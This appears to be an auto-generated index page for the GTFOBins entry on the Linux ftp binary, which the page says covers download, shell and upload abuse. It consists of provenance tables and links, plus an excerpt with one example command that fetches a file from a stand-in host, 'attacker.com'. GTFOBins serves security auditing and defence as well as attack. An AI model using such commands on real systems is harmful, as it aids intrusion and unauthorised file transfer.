---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# ftp

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `ftp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ftp` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for ftp covering download, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/ftp.md)
- Source verification: [source record](../../sources/gtfobins/ftp.md)

## Aliases

- `ftp`

## Source Verification

[source record](../../sources/gtfobins/ftp.md)

## Evidence Excerpt

```text
_body: ''
_name: ftp
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ftp
functions:
download:
- code: 'ftp -a attacker.com
get /path/to/input-file output-file'
comment: Instead of `-a`, credentials can be supplied via the `user:password@host` connection string.
```
